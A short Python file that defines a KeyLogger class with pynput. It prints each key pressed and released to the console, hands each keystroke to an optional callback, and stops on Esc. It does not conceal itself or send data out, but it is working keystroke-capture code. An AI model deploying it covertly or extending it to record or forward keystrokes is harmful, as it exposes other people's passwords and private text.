from pynput import keyboard

class KeyLogger:
    def __init__(self, on_key_callback = None):
        self.on_key_callback = on_key_callback
    def on_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        print(f"Key pressed: {key_str}")
        if self.on_key_callback:
            self.on_key_callback(key_str)
    def on_relese(self, key):
        print(f"Key released: {key}")
        if key == keyboard.Key.esc:
            return False
    def start(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_relese
        )
        listener.start()
        